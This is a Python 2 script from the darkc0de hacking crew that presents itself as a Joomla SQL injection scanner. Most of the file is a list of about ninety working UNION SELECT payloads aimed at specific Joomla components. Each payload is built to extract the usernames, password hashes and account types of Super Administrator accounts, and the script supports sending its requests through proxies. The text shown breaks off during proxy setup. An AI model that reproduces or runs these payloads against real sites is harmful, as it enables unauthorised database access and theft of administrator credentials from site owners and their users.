#!/usr/bin/python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 

# Joomla Vulnerability Scanner v1.3

# Feel free to do whatever you want with this code!
# Share the c0de!

# Orignal Code concept by beenu - www.beenuarora.com
# 1.I redid all the paths.. had some dupes in there..
# 2.When a SQLi is found Username:pass:usertype are displayed.. Super Administrator by default
# 2.I redid the regular expression search... No chance of a false positive now
# 3.added all my other standard app features.. proxy.. save file.. 

# darkc0de Crew 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, P47r1ck, Tarsian, c0mr@d, reverenddigitalx, beenu, baltazar, C1c4Tr1Z
# and the rest of the Darkc0de members

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!

# BE WARNED, THIS TOOL IS VERY LOUD..

import sys,os, re, urllib2, socket, time

#determine platform
if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

#say hello
os.system(SysCls)
if len(sys.argv) <= 1:
        print "|-----------------------------------------|"
        print "| rsauron[@]gmail[dot]com          v1.3   |"
        print "|   8/2008            darkc0de.com        |"
        print "|    -- Joomla SQLi Vulnerability Scanner |"
        print "| Usage: joomscan.py [options]            |"
        print "|                    -h help              |"
        print "|-----------------------------------------|\n"
        sys.exit(1)

#define varablies
host = ""
dbt = "joomscanlog.txt"
proxy = "None"
pre = "jos"
count = 0
gets = 0
md5s = 0

#help option
for arg in sys.argv:
        if arg == "-h":
                print "\n   Usage: ./joomscan.py [options]        rsauron[@]gmail[dot]com darkc0de.com"
                print "\n\tRequired:"
                print "\tDefine: -u       \"www.site.com/joomladir/\""
                print "\n\tOptional:"
                print "\tDefine: -dbpre   Example. darkc0de_users  Default: jos_users"
                print "\tDefine: -p       \"127.0.0.1:80 or proxy.txt\""
                print "\tDefine: -o       \"ouput_file_name.txt\"  Default:joomscanlog.txt"
                print "\n   Ex: ./joomscan.py -u \"www.site.com/joomladir/\""
                print "   Ex: ./joomscan.py -u \"www.site.com/joomladir/\" -dbpre darkc0de -p proxy.txt"
                print "   Ex: ./joomscan.py -u \"www.site.com/joomladir/\" -o site.txt -p 127.0.0.1:80"
                sys.exit(1)

#Check args
for arg in sys.argv:
	if arg == "-u":
		host = sys.argv[count+1]
	elif arg == "-dbpre":
                pre = sys.argv[count+1]
	elif arg == "-o":
		dbt = sys.argv[count+1]
	elif arg == "-p":
		proxy = sys.argv[count+1]
	count+=1

#Arg Error Checking
if host == "":
        print "\n[-] Must include -u flag."
        print "[-] For help -h\n"
        sys.exit(1)
if host[:7] != "http://": 
        host = "http://"+host 
if host[-1:] != "/": 
        host = host+"/"
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
        
#Title Write
file = open(dbt, "a")
print "|-----------------------------------------|"
print "| rsauron[@]gmail[dot]com          v1.3   |"
print "|   8/2008            darkc0de.com        |"
print "|    -- Joomla SQLi Vulnerability Scanner |"
print "| Usage: joomscan.py [options]            |"
print "|                    -h help              |"
print "|-----------------------------------------|"
file.write("\n|-----------------------------------------|")
file.write("\n| rsauron[@]gmail[dot]com          v1.3   |")
file.write("\n|   8/2008            darkc0de.com        |")
file.write("\n|    -- Joomla SQLi Vulnerability Scanner |")
file.write("\n| Usage: joomscan.py [options]            |")
file.write("\n|                    -h help              |")
file.write("\n|-----------------------------------------|")


paths = ["index.php?option=com_is&task=motor&motor=-1+UNION+SELECT+1,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),4,5,6,7,8,9,10,11,12,13+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
        "index.php?option=com_content&task=blogcategory&id=60&Itemid=99999+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
        "index.php?option=com_dtregister&eventId=-12+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72&task=pay_options&Itemid=138",
        "index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=61&cat_id=-9999999+UNION+SELECT+000,111,222,333,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,2+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_clasifier&Itemid=61&cat_id=-9999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_simpleshop&Itemid=41&cmd=section&section=-000+UNION+SELECT+000,111,222,333,0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_joomladate&task=viewProfile&user=9999999+UNION+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",  
	"index.php?option=com_gameq&task=page&category_id=-1+UNION+SELECT+1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,6,7,8,9,10,11,12,13,14+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_simpleshop&task=browse&Itemid=29&catid=-1+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_joomradio&page=show_video&id=-1+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_idoblog&task=userblog&userid=42+and+1=1+UNION+SELECT+1,1,1,1,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1,1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"administrator/components/com_astatspro/refer.php?id=-1+UNION+SELECT+0,1,concat(username,0x3a,password,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index2.php?option=com_prayercenter&task=view_request&id=-1+UNION+SELECT+1,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1,1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_biblestudy&view=mediaplayer&id=-1+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,13,14,15,16,17,18,19,20,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_easybook&Itemid=1&func=deleteentry&gbid=-1+UNION+SELECT+1,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_galeria&Itemid=61&func=detail&id=-999999+UNION+SELECT+0,0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),111,222,333,0,0,0,0,0,1,1,1,1,1,1,444,555,666,7+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_artist&idgalery=-1+UNION+SELECT+1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,6,7,8,9+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_jooget&Itemid=61&task=detail&id=-1+UNION+SELECT+0,333,0x3a,333,222,222,222,111,111,111,0,0,0,0,0,0,0,0,1,1,2,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_quiz&task=user_tst_shw&Itemid=61&tid=1+UNION+SELECT+0,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=2&task=view&iid=-3333+UNION+SELECT+0,1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_xfaq&task=answer&Itemid=42&catid=97&aid=-9988+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_pcchess&Itemid=61&page=players&user_id=-9999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_neogallery&task=show&Itemid=5&catid=999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),2,3+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_jpad&task=edit&Itemid=39&cid=-1+UNION+ALL+SELECT+1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,6,7,8+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_noticias&Itemid=xcorpitx&task=detalhe&id=-99887766+UNION++SELECT+0,concat(username,0x3a,password,0x3a,email),2,3,4,5++FROM++"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_doc&task=view&sid=-1+UNION+SELECT+1,1,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0x3a,5,6,7,8,password,username,11+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72/", 
	"index.php?option=com_marketplace&page=show_category&catid=-1+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),2,3+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_directory&page=viewcat&catid=-1+UNION+SELECT+0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_neoreferences&Itemid=27&catid=99887766+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72+where+user_id=1=1--", 
	"index.php?option=com_puarcade&Itemid=92&fid=-1+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_ynews&Itemid=0&task=showYNews&id=-1+UNION+SELECT+0,1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,6+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_xfaq&task=answer&Itemid=27&catid=97&aid=-9988+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_rsgallery&page=inline&catid=-1+UNION+SELECT+1,2,3,4,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),6,7,8,9,10,11+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_mcquiz&task=user_tst_shw&Itemid=42&tid=1+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0x3a+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=S@BUN&task=view&iid=-3333+UNION+SELECT+0,1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_eventlist&func=details&did=9999999999999+UNION+SELECT+0,0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),4,5,6,7,8,9,00,0,444,555,0,777,0,999,0,0,0,0,0,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_nicetalk&tagid=-2)+UNION+SELECT+1,2,3,4,5,6,7,8,0,999,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),777,666,555,444,333,222,111+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_neorecruit&task=offer_view&id=option=com_neorecruit&task=offer_view&id=99999999999+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5,6,7,8,111,222,333,444,0,0,0,555,666,777,888,1,2,3,4,5,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_gmaps&task=viewmap&Itemid=57&mapId=-1+UNION+SELECT+0,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5,6,7,8+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_garyscookbook&Itemid=21&func=detail&id=-666+UNION+SELECT+0,0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_ponygallery&Itemid=x&func=viewcategory&catid=+UNION+SELECT+1,2,3,4,0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--", 
	"index.php?option=com_equotes&id=13+and+1=1+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_rwcards&task=listCards&category_id=-1'UNION+SELECT+1,2,03,4,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),50,044,076,0678,07+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_hello_world&Itemid=27&task=show&type=intro&id=-9999999+UNION+SELECT+1,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),4+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_product&Itemid=12&task=viewlist&catid=-9999999+UNION+SELECT+username,1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,6,7,8,9+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_cms&act=viewitems&cat_id=-9999999+UNION+SELECT+111,111,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),222,222,333,333+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_most&mode=email&secid=-9999999+UNION+SELECT+0000,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),2222,3333+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_idvnews&id=-1+UNION+SELECT+0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),2222,0,0,0,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_actualite&task=edit&id=-1+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5,6,7,8,9+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_joomlavvz&Itemid=34&func=detail&id=-9999999+UNION+SELECT+0x3a,0x3a,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0,0,0,0,0,0,0,0,0,0,0,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_referenzen&Itemid=7&detail=-9999999+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5,6,7,8,9,0,0,0,0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_genealogy&task=profile&id=-9999999+UNION+SELECT+0,1,2,3,4,5,6,7,8,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_listoffreeads&AdId=-1+UNION+SELECT+0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_facileforms&Itemid=640&user_id=107&catid=-9999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_geoboerse&page=view&catid=-1+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_ricette&Itemid=S@BUN&func=detail&id=-9999999+UNION+SELECT+0,0,111,111,222,333,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_team&gid=-1+UNION+SELECT+1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,6,7,8,9,10,username,12,13+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_formtool&task=view&formid=2&catid=-9999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_profile&Itemid=42&task=&task=viewoffer&oid=9999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_sg&Itemid=16&task=order&range=3&category=3&pid=-9999999+UNION+SELECT+0,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0,0,0,0,0,0,0,10,11,0,0,14,15,16+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=faq&task=viewallfaq&catid=-9999999+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0,0+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_omnirealestate&Itemid=0&func=showObject&info=contact&objid=-9999+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--&results=joomla",
	"index.php?option=com_model&Itemid=0&task=pipa&act=2&objid=-9999+UNION+SELECT+username,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_mezun&task=edit&hidemainmenu=joomla&id=-9999999+UNION+SELECT+0,0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_ewriting&Itemid=9999&func=SELECTcat&cat=-1+UNION+ALL+SELECT+1,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),4,5,6,7,8,9,10+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_candle&task=content&cID=-9999+UNION+SELECT+1,2,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),5,6+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_acajoom&act=mailing&task=view&listid=1&Itemid=1&mailingid=1+UNION+SELECT+1,1,1,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72+LIMIT+1,1--",
	"index.php?option=com_restaurante&task=detail&Itemid=S@BUN&id=-99999+UNION+SELECT+0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,4,4,4,4,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_productshowcase&Itemid=S@BUN&action=details&id=-99999+UNION+SELECT+0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),0,0,0,0,0,1,1,1,1,2,3,4,5+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_rekry&Itemid=60&rekryview=view&op_id=-1+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72+limit+1,1--",
	"index.php?option=com_d3000&task=showarticles&id=-99999+UNION+SELECT+0,username,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_cinema&Itemid=S@BUN&func=detail&id=-99999+UNION+SELECT+0,1,0x3a,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999+UNION+SELECT+0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999+UNION+SELECT+0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_joovideo&Itemid=S@BUN&task=detail&id=-99999+UNION+SELECT+0,0,0x3a,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_myalbum&album=-1+UNION+SELECT+0,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),2,3,4+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_filiale&idFiliale=-5+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5,6,7,8,9,10,11+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_flippingbook&Itemid=28&book_id=null+UNION+SELECT+null,concat(username,0x3e,password),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_vr&Itemid=78&task=viewer&room_id=-1+UNION+SELECT+concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),2+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_alphacontent&section=6&cat=15&task=view&id=-999999+UNION+SELECT+1,concat(username,0x3e,password),3,4,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,39+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_mygallery&func=viewcategory&cid=-1+UNION+SELECT+1,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),4,5,6,7,8,9,10,11,12+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_versioning&task=edit&id=-83+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 FROM "+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_beamospetition&pet=-5+UNION+SELECT+1,1,1,1,1,1,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),1,1,1,1,1,1,1+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_jabode&task=sign&sign=taurus&id=-2+UNION+SELECT+1,1,1,1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_expshop&page=show_payment&catid=-2+UNION+SELECT+1,2,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_cinema&Itemid=S@BUN&func=detail&id=-99999+UNION+SELECT+0,1,0x3a,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,29,29,30,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e)+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_resman&task=moreinfo&id=-1+UNION+SELECT+111,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),333+FROM+"+pre+"_users+where+usertype=0x53757065722041646d696e6973747261746f72--"] 

socket.setdefaulttimeout(10) 
print "[+] JoomlaPath:",host
print "[+] Vulns Loaded:",len(paths)
file.write("\n[+] JoomlaPath: "+str(host))
file.write("\n[+] Vulns Loaded: "+str(len(paths)))

#Build proxy list
proxy_list = []
if proxy != "None":
        file.write("[+] Building Proxy List...")
        print "[+] Building Proxy List..."
        for p in proxy:
                try:
                    proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
                    opener = urllib2.build_opener(proxy_handler)
                    opener.open("http://www.google.com")
                    proxy_list.append(urllib2.build_opener(proxy_handler))
                    file.write("\n\tProxy:"+p+"- Success")
                    print "\tProxy:",p,"- Success"
                except:
                    file.write("\n\tProxy:"+p+"- Failed")
                    print "\tProxy:",p,"- Failed"
                    pass
        if len(proxy_list) == 0:
                print "[-] All proxies have failed. App Exiting"
